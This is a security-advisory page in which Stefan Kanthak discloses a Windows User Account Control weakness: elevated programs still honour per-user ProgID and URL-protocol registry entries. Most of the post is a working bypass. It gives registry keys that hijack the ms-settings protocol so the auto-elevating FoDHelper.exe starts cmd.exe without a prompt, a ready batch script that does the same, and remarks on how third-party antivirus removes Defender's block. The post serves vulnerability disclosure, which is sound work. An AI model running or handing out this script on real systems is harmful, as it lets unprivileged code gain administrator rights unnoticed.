---
title: Microsoft User Account Control Nuances
url: https://cxsecurity.com/issue/WLB-2023030044
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-20
fetch_date: 2025-10-04T10:04:34.597374
---

# Microsoft User Account Control Nuances

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft User Account Control Nuances** **2023.03.19**  Credit:  **[Stefan Kanthak](https://cxsecurity.com/author/Stefan%2BKanthak/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Hi @ll,
with Windows 2000, Microsoft virtualised the [HKEY\_CLASSES\_ROOT] registry
branch: what was just an alias for [HKEY\_LOCAL\_MACHINE\SOFTWARE\Classes]
before became the overlay of [HKEY\_LOCAL\_MACHINE\SOFTWARE\Classes] and
[HKEY\_CURRENT\_USER\Software\Classes] with the latter having precedence:
<https://msdn.microsoft.com/en-us/library/ms724498.aspx>
Note: while [HKEY\_LOCAL\_MACHINE\SOFTWARE\Classes] is writable only by
(privileged) administrators, [HKEY\_CURRENT\_USER\Software\Classes]
is writable by the (current) unprivileged user.
With Windows Vista they introduced the "security theatre" called
"User Account Control" (a far better name is "qUACkery"):
<https://blogs.msdn.microsoft.com/uac/2005/12/08/user-account-control/>
| User Account Protection was the preliminary name for a core security
| component of Windows Vista. The component has now been officially named
| User Account Control (UAC).
The qUACkery sort of lobotomises administrator accounts and splits their
brain^Waccess token: the "shell", i.e. EXPLORER.exe, and all programs run
from it use a restricted access token without administrative privileges.
For the (not so few) programs which but need administrative privileges,
Microsoft introduced a "kill switch" in the application manifest:
<https://msdn.microsoft.com/en-us/library/aa374191.aspx>
<https://msdn.microsoft.com/en-us/library/bb756929.aspx>
| <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
| <security>
| <requestedPrivileges>
| <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
| </requestedPrivileges>
| </security>
| </trustInfo>
With this loop^Wwormhole, the virtualised [HKEY\_CLASSES\_ROOT] introduced
with Windows 2000 became but a can of worms: in STANDARD installations of
Windows, applications running with administrative privileges, i.e. an
integrity level above "Medium", now evaluate registry settings (COM CLSIDs,
ProgIDs, URL protocols, ...) which are under control of the unprivileged
user.
<https://msdn.microsoft.com/en-us/library/ms724498.aspx>
| If an application is run with administrator rights and User Account
| Control is disabled, the COM runtime ignores per-user COM configuration
| and accesses only per-machine COM configuration.
<https://msdn.microsoft.com/en-us/library/bb756926.aspx>
| Beginning with Windows Vista and Windows Server 2008, if the
| integrity level of a process is higher than Medium, the COM runtime
| ignores per-user COM configuration and accesses only per-machine
| COM configuration. This action reduces the surface area for elevation
| of privilege attacks, preventing a process with standard user privileges
| from configuring a COM object with arbitrary code and having this code
| called from an elevated process.
OOPS: COM CLSIDs have been removed from the can of worms.
But what about ProgIDs and URL protocols?
<https://msdn.microsoft.com/en-us/library/cc144152.aspx>
Demonstration:
~~~~~~~~~~~~~~
1) Start the command processor in the user account created during
Windows setup;
2) Execute the "Feature on Demand" helper application FoDHelper.exe
(which requires administrative privileges, but elevates SILENTLY),
then close the "Immersive Control Panel" window it opened;
3) Add the following registry entries to replace the application run
by the elevated FoDHelper.exe from "Immersive Control Panel" to
"Windows Command Processor" (or an arbitrary other one):
[HKEY\_CURRENT\_USER\Software\Classes\qUACkery\Shell\Open\Command]
@="C:\\Windows\\System32\\Cmd.exe"
[HKEY\_CURRENT\_USER\Software\Classes\MS-Settings\CurVer]
@="qUACkery"
4) Execute FoDHelper.exe again;
5) Remove the registry entries created in step 3.
If you prefer a batch script:
--- quackery.cmd
REG.exe ADD "HKEY\_CURRENT\_USER\Software\Classes\qUACkery\Shell\Open\Command" /VE /T REG\_SZ /D "%COMSPEC%" /F
REG.exe ADD "HKEY\_CURRENT\_USER\Software\Classes\MS-Settings\CurVer" /VE /T REG\_SZ /D "qUACkery" /F
FoDHelper.exe
REG.exe DELETE "HKEY\_CURRENT\_USER\Software\Classes\MS-Settings" /F
REG.exe DELETE "HKEY\_CURRENT\_USER\Software\Classes\qUACkery" /F
--- EOF ---
OOPS: Windows Defender blocks the execution of FoDHelper.exe
Spoiler: installation of another anti-virus, for example McAfee,
Bitdefender, Eset, Sophos, Avira, AVG/Avast, TrendMicro,
deactivates Windows Defender and lets FoDHelper.com run
an arbitrary application elevated, without UAC prompt.
stay tuned, and far away from the eternally vulnerable crap oozing out of Redmond
Stefan Kanthak
PS: finding the applications which call the ProgIDs/URL protocols
ms-settings-airplanemode, ms-settings-bluetooth, ms-settings-cellular,
ms-settings-connectabledevices, ms-settings-displays-topology,
ms-settings-emailandaccounts, ms-settings-language, ms-settings-location,
ms-settings-lock, ms-settings-mobilehotspot, ms-settings-notifications,
ms-settings-power, ms-settings-privacy, ms-settings-proximity,
ms-settings-screenrotation, ms-settings-wifi, ms-settings-workplace
is left as an exercise to the reader.
PPS: for all these URL protocols, the wise guys from Redmond added the
following registry entries to ease their exploitation:
[HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ProtocolExecute\ms-settings]
"WarnOnOpen"=dword:00000000
...
[HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ProtocolExecute\ms-settings-workplace]
"WarnOnOpen"=dword:00000000

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030044)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x....